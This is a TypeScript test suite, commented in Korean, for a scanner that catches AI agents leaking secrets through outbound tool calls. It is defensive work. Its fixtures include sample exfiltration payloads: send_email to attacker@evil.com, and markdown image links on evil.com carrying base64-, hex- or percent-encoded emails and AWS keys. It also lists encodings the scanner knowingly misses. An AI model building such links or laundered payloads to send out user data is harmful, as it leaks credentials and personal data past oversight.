/**
 * TIER3 출력-스캔 회귀 테스트 — 미탐 #1 벡터 A(세탁 민감 유출) 차단 + 과차단 0.
 *
 * ★ 핵심 과차단 가드: 고엔트로피 정상값(git SHA·UUID·JWT·integrity 해시)은 미발동.
 *   엔트로피를 의도적으로 안 쓰기 때문 — 벤치가 토큰 <20자로 숨기던 과차단을
 *   여기서 실측·고정한다.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { writeFileSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import type { SecretDetectionConfig } from "./config.js";
import { scanOutputForSensitive, type SensitivePayload } from "./output-scan.js";

const DET: SecretDetectionConfig = {
  bySource: true,
  // ★ byEntropy를 일부러 켜 둔다 — 그래도 출력-스캔이 엔트로피를 안 써야 SHA/UUID가 통과.
  byEntropy: { minLength: 20, entropyThreshold: 3.8 },
  byRegex: [
    { type: "AWS_KEY", pattern: "\\bAKIA[0-9A-Z]{16}\\b" },
    { type: "GITHUB_TOKEN", pattern: "\\bgh[pousr]_[A-Za-z0-9]{36,255}\\b" },
  ],
};

const SECRET_PAYLOADS: SensitivePayload[] = [
  { toolName: "read_secrets", payload: { secret: "MYSECRETPASSWORDVALUE" } }, // 21자
];

// ── 포함검사 ──────────────────────────────────────────────────────────────
test("containment: 민감 원본이 출력에 통째로 포함되면 탐지", () => {
  const f = scanOutputForSensitive(SECRET_PAYLOADS, { body: "leak MYSECRETPASSWORDVALUE now" }, DET);
  assert.equal(f?.kind, "containment");
  assert.equal(f?.sourceTool, "read_secrets");
});

test("containment: <8자 청크로 세탁해도 concat 재조립으로 탐지 (attack1)", () => {
  const f = scanOutputForSensitive(SECRET_PAYLOADS, { parts: ["MYSECRE", "TPASSW", "ORDVAL", "UE"] }, DET);
  assert.equal(f?.kind, "containment");
});

test("containment: 무관한 정상 출력은 미발동", () => {
  const f = scanOutputForSensitive(SECRET_PAYLOADS, { body: "build succeeded in 42s" }, DET);
  assert.equal(f, null);
});

test("min-length: 짧은 민감값(<12)은 우연일치 방지로 제외 → 과차단 없음", () => {
  const shortPayloads: SensitivePayload[] = [{ toolName: "query_customer_db", payload: { grade: "VIP" } }];
  const f = scanOutputForSensitive(shortPayloads, { body: "VIP lounge access granted" }, DET);
  assert.equal(f, null);
});

// ── 정규식(엔트로피 제외) ───────────────────────────────────────────────────
test("regex: verbatim AWS 키 탐지", () => {
  const f = scanOutputForSensitive([], { body: "key=AKIAIOSFODNN7EXAMPLE done" }, DET);
  assert.equal(f?.kind, "regex");
});

test("regex: verbatim GitHub 토큰 탐지", () => {
  const f = scanOutputForSensitive([], { token: "ghp_" + "A".repeat(36) }, DET);
  assert.equal(f?.kind, "regex");
});

// ── ★ 과차단 가드: 고엔트로피 정상값 미발동 (엔트로피 미사용 증명) ──────────────
test("★ git SHA(40hex) 정상값 — byEntropy가 켜져 있어도 미발동", () => {
  const f = scanOutputForSensitive([], { body: "deploy 9f3ab2c1e4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a9" }, DET);
  assert.equal(f, null);
});

test("★ UUID v4 정상값 — 미발동", () => {
  const f = scanOutputForSensitive([], { traceId: "550e8400-e29b-41d4-a716-446655440000" }, DET);
  assert.equal(f, null);
});

test("★ JWT 정상값 — 미발동", () => {
  const jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N";
  const f = scanOutputForSensitive([], { authorization: `Bearer ${jwt}` }, DET);
  assert.equal(f, null);
});

test("★ npm integrity(sha512-) 정상값 — 미발동", () => {
  const integ = "sha512-oPX8q3aB9cD2eF4gH6iJ8kL0mN2oP4qR6sT8uV0wX2yZ4aB6cD8eF0gH2iJ4kL6mN8oP0qR2sT4uV6";
  const f = scanOutputForSensitive([], { integrity: integ }, DET);
  assert.equal(f, null);
});

// ── base64 디코딩 전처리 (풀버전 1단계) ────────────────────────────────────
const B64_SECRET = "dbConnString_Prod_Xy7788"; // 24자
const b64Payloads: SensitivePayload[] = [{ toolName: "read_env_file", payload: { conn: B64_SECRET } }];
const enc = Buffer.from(B64_SECRET).toString("base64");

test("base64: 세탁(단일 base64)된 민감 원본 탐지", () => {
  const f = scanOutputForSensitive(b64Payloads, { body: `payload ${enc}` }, DET);
  assert.equal(f?.kind, "containment");
});

test("base64: 청크로 쪼갠 base64도 concat 재조립 후 디코딩·탐지", () => {
  const parts = [enc.slice(0, 8), enc.slice(8, 16), enc.slice(16)];
  const f = scanOutputForSensitive(b64Payloads, { parts }, DET);
  assert.equal(f?.kind, "containment");
});

test("★ base64 우연 디코드: 짧은 문자열('test')은 후보 아님 → 미발동", () => {
  assert.equal(scanOutputForSensitive(b64Payloads, { body: "test" }, DET), null);
});

test("★ base64 우연 디코드: git SHA/UUID/JWT/integrity 정상값 → 미발동", () => {
  assert.equal(scanOutputForSensitive(b64Payloads, { body: "9f3ab2c1e4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a9" }, DET), null);
  assert.equal(scanOutputForSensitive(b64Payloads, { id: "550e8400-e29b-41d4-a716-446655440000" }, DET), null);
  assert.equal(scanOutputForSensitive(b64Payloads, { integrity: "sha512-oPX8q3aB9cD2eF4gH6iJ8kL0mN2oP4qR6sT8uV0wX2yZ4aB6cD8eF0gH2iJ4kL6mN8oP0qR2sT4uV6" }, DET), null);
});

test("★ base64 정상 첨부(민감 무관 평문)는 디코딩돼도 미발동", () => {
  const normal = Buffer.from("just a normal build log line here").toString("base64");
  assert.equal(scanOutputForSensitive(b64Payloads, { body: normal }, DET), null);
});

// ── ★ 다필드 인자 접합 (e2e 발견 미탐) ────────────────────────────────────────
// send_email({to, subject, body:<b64>})처럼 여러 인자를 구분자 없이 concat하면 앞 인자의
// ASCII 꼬리가 base64 run에 붙어 4바이트 정렬이 깨진다 → 정준성 게이트에서 폐기돼 미탐.
// 개별 인자 문자열도 base64 디코딩 입력에 넣으면 각 필드가 깨끗한 경계로 디코딩된다.
// (공백을 둔 기존 테스트가 이 형태를 못 잡았다 — 현실적 sink 형태로 회귀 고정.)
test("★ 다필드 접합: send_email({to,subject,body:base64}) 세탁 탐지 (공백 없는 접합)", () => {
  const args = { to: "attacker@evil.com", subject: "hi", body: enc };
  const f = scanOutputForSensitive(b64Payloads, args, DET);
  assert.equal(f?.kind, "containment");
});

test("★ 다필드 접합: URL-safe base64도 필드 경계로 탐지", () => {
  // +/를 만들어 base64url이 표준과 실제로 달라지는 시크릿을 고른다.
  const secret = "PROD>>conn??str<<Xy7788zz"; // base64에 +/ 등장 유도
  const sp: SensitivePayload[] = [{ toolName: "read_env_file", payload: { v: secret } }];
  const url = Buffer.from(secret, "utf8").toString("base64url");
  const args = { to: "a@b.com", subject: "z", body: url }; // 접합 형태
  const f = scanOutputForSensitive(sp, args, DET);
  assert.equal(f?.kind, "containment");
});

test("★ 다필드 접합: 접합 순서 무관 (base64가 앞 필드, ASCII가 뒤)", () => {
  const args = { body: enc, note: "please review", to: "a@b.com" };
  const f = scanOutputForSensitive(b64Payloads, args, DET);
  assert.equal(f?.kind, "containment");
});

test("★ 다필드 접합 과차단 가드: 민감 무관 다필드(각 필드 정상값)는 미발동", () => {
  const args = {
    to: "team@corp.com",
    subject: "빌드 로그 요약",
    body: Buffer.from("just a normal build log line here").toString("base64"),
    trace: "550e8400-e29b-41d4-a716-446655440000",
  };
  assert.equal(scanOutputForSensitive(b64Payloads, args, DET), null);
});

test("★ 다필드 접합 회귀: 공백 있는 단일 필드는 여전히 탐지 (기존 경로 불변)", () => {
  assert.equal(scanOutputForSensitive(b64Payloads, { body: `payload ${enc}` }, DET)?.kind, "containment");
});

// ── 정규화 매칭 (재포맷 세탁) ────────────────────────────────────────────────
test("normalize: 재포맷(대소문자·구분자) 세탁된 민감 탐지", () => {
  const sp: SensitivePayload[] = [{ toolName: "read_env_file", payload: { v: "dbConnString_Prod_Xy7788" } }];
  const f = scanOutputForSensitive(sp, { body: "db conn string PROD xy7788" }, DET);
  assert.equal(f?.kind, "containment");
  assert.equal(f?.normalized, true);
});

test("normalize: RS08식 재포맷 + base64 세탁 탐지 (SECRET=Kx.. ↔ SecretKx..)", () => {
  const sp: SensitivePayload[] = [{ toolName: "read_env_file", payload: { v: "SECRET=Kx9021ffb" } }];
  // "U2VjcmV0S3g5MDIxZmZi" = base64("SecretKx9021ffb")
  const f = scanOutputForSensitive(sp, { body: "info U2VjcmV0S3g5MDIxZmZi end" }, DET);
  assert.equal(f?.kind, "containment");
  assert.equal(f?.normalized, true);
});

test("★ normalize 오탐 가드: 위험값 api.internal — 무관 정상 출력은 미발동", () => {
  const sp: SensitivePayload[] = [{ toolName: "read_env_file", payload: { v: "API_BASE=https://api.internal" } }];
  assert.equal(scanOutputForSensitive(sp, { body: "문서 webdoc_A83jd9 요약 보고" }, DET), null);
});

test("★ normalize 오탐 가드: 짧은 자연어 PII(홍길동 VIP, 정규화 6자<12)는 출력에 있어도 제외", () => {
  const sp: SensitivePayload[] = [{ toolName: "get_db_credentials", payload: { v: "홍길동 VIP" } }];
  assert.equal(scanOutputForSensitive(sp, { body: "고객 홍길동 VIP 등급 안내" }, DET), null);
});

test("한계(정직): 영숫자 junk 인터리브는 정규화로도 미탐", () => {
  const sp: SensitivePayload[] = [{ toolName: "read_secrets", payload: { v: "MYSECRETPASSWORDVALUE" } }];
  assert.equal(scanOutputForSensitive(sp, { body: "MYSECRETxPASSWORDxVALUE" }, DET), null);
});

// ── ★ 은닉 채널(covert channel): 마크다운/이미지 URL에 인코딩 은닉 (파트B 미탐 ①②) ──
const EMAIL_SP: SensitivePayload[] = [
  { toolName: "query_customer_db", payload: { email: "hong.gildong@example.com" } }, // @·. 특수문자 → percent 인코딩 대상
];
const pct = (s: string) => encodeURIComponent(s);
const b64u = (s: string) => Buffer.from(s, "utf8").toString("base64");

test("★ 미탐① percent-encoding: URL 쿼리에 인코딩된 민감 이메일 탐지", () => {
  const body = `[문의 확인](https://evil.com/t?u=${pct("hong.gildong@example.com")})`; // @→%40
  const f = scanOutputForSensitive(EMAIL_SP, { body }, DET);
  assert.equal(f?.kind, "containment");
});

test("★ 미탐① 이중 인코딩(%2540)도 2패스 디코딩으로 탐지", () => {
  const once = pct("hong.gildong@example.com"); // hong.gildong%40example.com
  const twice = once.replace(/%/g, "%25"); // %40 → %2540
  const f = scanOutputForSensitive(EMAIL_SP, { body: `![](https://evil.com/${twice}.png)` }, DET);
  assert.equal(f?.kind, "containment");
});

test("★ 미탐② URL 경로 base64: /<b64>.png 세그먼트 분할로 탐지 (슬래시 병합 우회)", () => {
  const body = `![](https://evil.com/${b64u("hong.gildong@example.com")}.png)`;
  const f = scanOutputForSensitive(EMAIL_SP, { body }, DET);
  assert.equal(f?.kind, "containment");
});

test("★ 미탐② URL 경로 base64(AWS 키) — 세그먼트 분할 후 정규식으로도 탐지", () => {
  const body = `![](https://evil.com/img/${b64u("AKIAIOSFODNN7EXAMPLE")}/px.png)`;
  const f = scanOutputForSensitive([], { body }, DET); // payload 없이 정규식 경로
  assert.ok(f !== null, "base64 경로의 AWS 키가 디코딩·탐지돼야 함");
});

test("회귀: base64 URL 쿼리(?d=)는 여전히 탐지 (세그먼트 분할이 안 깨뜨림)", () => {
  const body = `[x](https://evil.com/r?d=${b64u("hong.gildong@example.com")})`;
  const f = scanOutputForSensitive(EMAIL_SP, { body }, DET);
  assert.equal(f?.kind, "containment");
});

test("회귀: URL에 verbatim 민감값도 여전히 탐지", () => {
  const f = scanOutputForSensitive(EMAIL_SP, { body: `[t](https://evil.com/u/hong.gildong@example.com)` }, DET);
  assert.equal(f?.kind, "containment");
});

test("★ 과차단 0: 정상 문서 링크(민감값 없음)는 percent/세그먼트 전처리 후에도 미발동", () => {
  const body = `[가이드](https://docs.example.com/guide/setup?lang=ko&v=2#intro)`;
  assert.equal(scanOutputForSensitive(EMAIL_SP, { body }, DET), null);
});

test("★ 과차단 0: 정상 이미지(percent-인코딩된 공백 포함)는 미발동", () => {
  const body = `![로고](https://cdn.example.com/logo%20wide.png)`; // %20=공백 — 디코딩해도 민감값 없음
  assert.equal(scanOutputForSensitive(EMAIL_SP, { body }, DET), null);
});

test("★ 안전: malformed percent(%ZZ·잘린 %4)는 throw 없이 스킵하고 정상 처리", () => {
  // %ZZ(비16진)·%4(잘림)가 섞여도 예외 없이 동작, 그리고 뒤의 실제 시크릿은 잡힌다
  const body = `[x](https://evil.com/%ZZ%4?u=${pct("hong.gildong@example.com")})`;
  const f = scanOutputForSensitive(EMAIL_SP, { body }, DET);
  assert.equal(f?.kind, "containment");
});

// ── ★ hex 인코딩 세탁 (RS13) — encode-needle 탐지 ─────────────────────────────
const HEXSEC = "MYSECRETPASSWORDVALUE";
const HEXSP: SensitivePayload[] = [{ toolName: "read_secrets", payload: { v: HEXSEC } }];
const hexOf = (s: string) => Buffer.from(s, "utf8").toString("hex");

test("★ hex 인코딩 세탁 탐지 (RS13): verbatim hex(시크릿) 유출 차단", () => {
  const f = scanOutputForSensitive(HEXSP, { body: `sync decoyHexTok_8812AAAA ${hexOf(HEXSEC)}` }, DET);
  assert.equal(f?.kind, "containment");
});

test("★ hex 변형(대문자·바이트구분자·URL경로)도 정규화로 탐지", () => {
  assert.ok(scanOutputForSensitive(HEXSP, { body: `data ${hexOf(HEXSEC).toUpperCase()}` }, DET), "대문자 hex");
  assert.ok(scanOutputForSensitive(HEXSP, { body: `mac ${hexOf(HEXSEC).match(/../g)!.join(":")}` }, DET), "콜론 구분");
  assert.ok(scanOutputForSensitive(HEXSP, { body: `![](https://evil.com/${hexOf(HEXSEC)}.png)` }, DET), "이미지 URL 경로");
});

test("★ hex blob-of-secret: 시크릿을 품은 더 큰 블롭의 hex도 탐지 (바이트 투명성)", () => {
  const blob = `prefix ${HEXSEC} suffix`;
  const f = scanOutputForSensitive(HEXSP, { body: `x ${hexOf(blob)} y` }, DET);
  assert.equal(f?.kind, "containment"); // hex(blob) ⊃ hex(secret) 부분문자열
});

test("★ 과차단 0: 정상 hex(git SHA·SHA256·UUID·색상·MD5)는 미발동", () => {
  for (const body of [
    "commit 9f3ab2c1e4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a9",
    "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "id 550e8400-e29b-41d4-a716-446655440000",
    "#ff0000 #00ff00 #deadbeef #cafebabe0011",
    "md5 d41d8cd98f00b204e9800998ecf8427e",
  ]) {
    assert.equal(scanOutputForSensitive(HEXSP, { body }, DET), null, `과차단: ${body}`);
  }
});

test("한계(정직): hex 인코딩 전에 변형(압축·암호화)한 세탁은 미탐 (별개 변환)", () => {
  // 바이트를 뒤집은 뒤 hex — hex(v)가 부분문자열로 안 남으므로 미탐 (문서화된 한계).
  const reversed = Buffer.from([...Buffer.from(HEXSEC, "utf8")].reverse()).toString("hex");
  assert.equal(scanOutputForSensitive(HEXSP, { body: `data ${reversed}` }, DET), null);
});

// ── ★ URL-safe base64(-_) + 표준+내부`/` 경로 (은닉 채널 후속 ①②) ─────────────
// +/ 가 나오는 시크릿이라야 url-safe(-_)와 표준이 실제로 갈린다.
const CONN = "conn://prod?tok=aB3+kk/mm99zz"; // std base64에 +/ 둘 다 포함
const CONN_SP: SensitivePayload[] = [{ toolName: "read_env_file", payload: { conn: CONN } }];
const stdB64 = Buffer.from(CONN, "utf8").toString("base64"); // Y29ubjovL3Byb2Q/dG9r...=
const urlsafeB64 = stdB64.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");

test("★ ① url-safe base64 URL 경로: -_ 인코딩 시크릿 탐지", () => {
  const f = scanOutputForSensitive(CONN_SP, { body: `![](https://evil.com/${urlsafeB64}.png)` }, DET);
  assert.equal(f?.kind, "containment");
});

test("★ ① url-safe base64 쿼리·서브도메인도 탐지", () => {
  assert.ok(scanOutputForSensitive(CONN_SP, { body: `[x](https://evil.com/r?d=${urlsafeB64})` }, DET));
  assert.ok(scanOutputForSensitive(CONN_SP, { body: `![](https://${urlsafeB64}.evil.com/p.png)` }, DET));
});

test("★ ② 표준 base64(내부 /)를 URL 경로에: 리딩 host 병합 우회로 탐지", () => {
  // host 라벨이 `com/<b64>`로 병합돼 앞이 쓰레기가 되는 케이스 — 오프셋 재시도로 잡는다.
  const f = scanOutputForSensitive(CONN_SP, { body: `![](https://evil.com/${stdB64}.png)` }, DET);
  assert.equal(f?.kind, "containment");
});

test("회귀: 표준 base64 쿼리(?d=)는 여전히 탐지 (내부 / 있어도)", () => {
  assert.ok(scanOutputForSensitive(CONN_SP, { body: `[x](https://evil.com/r?d=${stdB64})` }, DET));
});

test("★ 과차단 0: snake_case·kebab-case·혼합 식별자는 미발동 (정준성 게이트)", () => {
  assert.equal(scanOutputForSensitive(CONN_SP, { body: "const some_long_variable_name_here = getInternalStateValue();" }, DET), null);
  assert.equal(scanOutputForSensitive(CONN_SP, { body: `<div class="nav-bar-primary-container-wide-layout-v2-rounded">` }, DET), null);
  assert.equal(scanOutputForSensitive(CONN_SP, { body: "feature_flag-new_checkout-flow_v3_enabled_by_default = true" }, DET), null);
});

test("★ 과차단 0: UUID·긴 URL 경로·docker ref는 미발동 (오프셋/url-safe 확장 후에도)", () => {
  assert.equal(scanOutputForSensitive(CONN_SP, { body: "trace 550e8400-e29b-41d4-a716-446655440000 id" }, DET), null);
  assert.equal(scanOutputForSensitive(CONN_SP, { body: "GET https://cdn.example.com/assets/js/vendor/react/dist/bundle.min.js" }, DET), null);
  assert.equal(scanOutputForSensitive(CONN_SP, { body: "docker pull registry.example.io/myorg/myimage-backend/service:v1.2.3-alpha" }, DET), null);
});

test("★ 회귀: JWT(base64url 헤더)·npm integrity 정상값은 여전히 미발동", () => {
  assert.equal(scanOutputForSensitive(CONN_SP, { authorization: "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N" }, DET), null);
  assert.equal(scanOutputForSensitive(CONN_SP, { integrity: "sha512-oPX8q3aB9cD2eF4gH6iJ8kL0mN2oP4qR6sT8uV0wX2yZ4aB6cD8eF0gH2iJ4kL6mN8oP0qR2sT4uV6" }, DET), null);
});

// ── ★ 대용량(1MB) 세탁 탐지 유지 + 과차단 0 (성능 최적화 후 무손실 회귀 가드) ──────
//    토큰화 dedup·needle-regex·concat-only 최적화가 대용량에서 탐지를 바꾸지 않음을 고정.
const PAD = (n: number) => "the quick brown fox jumps over the lazy dog. 정상 로그. ".repeat(Math.ceil(n / 54)).slice(0, n);
// 현실적 임베딩: 토큰 주변 공백(문서·로그엔 항상 구분자). 인접-무구분자는 base64 run 병합·regex \b
// 경계로 회피 가능한데, 이는 최적화와 무관한 기존 성질(exact/needle 포함검사는 인접이어도 잡음).
const embed = (p: string, at: number, total = 1048576) => PAD(at) + " " + p + " " + PAD(total - at - p.length - 2);
const bigSec = "dbConnString_Prod_Xy7788";
const bigPayloads: SensitivePayload[] = [{ toolName: "read_env_file", payload: { conn: bigSec } }];

for (const at of [0, 12345, 524288, 1048000]) {
  test(`1MB@${at}: verbatim 세탁 탐지`, () => {
    assert.ok(scanOutputForSensitive(bigPayloads, { body: embed(bigSec, at) }, DET));
  });
  test(`1MB@${at}: 재포맷(정규화) 세탁 탐지 (needle-regex)`, () => {
    assert.ok(scanOutputForSensitive(bigPayloads, { body: embed("db conn string PROD xy7788", at) }, DET));
  });
  test(`1MB@${at}: base64 세탁 탐지`, () => {
    assert.ok(scanOutputForSensitive(bigPayloads, { body: embed(Buffer.from(bigSec).toString("base64"), at) }, DET));
  });
  test(`1MB@${at}: RS08 재포맷+base64 탐지`, () => {
    const sp: SensitivePayload[] = [{ toolName: "read_env_file", payload: { v: "SECRET=Kx9021ffb" } }];
    assert.ok(scanOutputForSensitive(sp, { body: embed(Buffer.from("SecretKx9021ffb").toString("base64"), at) }, DET));
  });
}
test("1MB: 청크 세탁 concat 재조립 탐지", () => {
  assert.ok(scanOutputForSensitive(bigPayloads, { parts: [PAD(500000), "dbConnStr", "ing_Prod", "_Xy7788", PAD(500000)] }, DET));
});
test("★ 1MB 정상 로그 → 미발동(과차단 0)", () => {
  assert.equal(scanOutputForSensitive(bigPayloads, { body: PAD(1048576) }, DET), null);
});
test("★ 1MB SHA/base64 정상 덩어리 → 미발동", () => {
  assert.equal(scanOutputForSensitive(bigPayloads, { body: "9f3ab2c1e4d5f6a7".repeat(65536) }, DET), null);
  assert.equal(scanOutputForSensitive(bigPayloads, { body: Buffer.from(PAD(700000)).toString("base64") }, DET), null);
});
test("★ 결정론: 동일 1MB 입력 → 동일 판정", () => {
  const o = { body: embed(bigSec, 9999) };
  assert.deepEqual(scanOutputForSensitive(bigPayloads, o, DET), scanOutputForSensitive(bigPayloads, o, DET));
});

// ── 통합: evaluateToolCall 판정 경로 (lineage 모드) ──────────────────────────
const dir = mkdtempSync(path.join(tmpdir(), "taintguard-tier3-"));
const configFile = path.join(dir, "tier3.json");
writeFileSync(
  configFile,
  JSON.stringify({
    domain: "tier3-test",
    sensitiveSourceTools: ["read_secrets"],
    untrustedSourceTools: ["fetch_web_page"],
    outboundSinkTools: ["http_post"],
    judgmentMode: "lineage",
    secretDetection: { bySource: true, byEntropy: { minLength: 20, entropyThreshold: 3.8 }, byRegex: [] },
  })
);
process.env.TAINTGUARD_TOOL_REGISTRY = configFile;
const { recordToolResult, evaluateToolCall } = await import("./index.js");

function ctx(sessionId: string, toolName: string, args: Record<string, unknown>) {
  return { sessionId, toolName, args, argTags: [], timestamp: new Date().toISOString() };
}

test("통합: attack1 청크 세탁 → 차단 + outputScan 이벤트 첨부", () => {
  const sid = "t3-attack1";
  recordToolResult(sid, "fetch_web_page", undefined, { body: "ref TRACKINGCODEAAAAAAAA" });
  recordToolResult(sid, "read_secrets", undefined, { secret: "MYSECRETPASSWORDVALUE" });
  const dec = evaluateToolCall(ctx(sid, "http_post", { parts: ["MYSECRE", "TPASSW", "ORDVAL", "UE"] }));
  assert.equal(dec.allowed, false);
  assert.equal(dec.outputScan?.kind, "containment");
  assert.equal(dec.outputScan?.sourceTool, "read_secrets");
});

test("통합: floor 억제(U 매칭) + SHA 실은 정상 전송 → 통과 (TIER3 과차단 0)", () => {
  const sid = "t3-normal";
  recordToolResult(sid, "fetch_web_page", undefined, { body: "see webdoc_A83jd9x" }); // U
  recordToolResult(sid, "read_secrets", undefined, { secret: "MYSECRETPASSWORDVALUE" }); // S 별도 갈래
  const dec = evaluateToolCall(
    ctx(sid, "http_post", { body: "문서 webdoc_A83jd9x 요약, 커밋 9f3ab2c1e4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a9" })
  );
  assert.equal(dec.allowed, true);
  assert.equal(dec.outputScan, undefined);
});
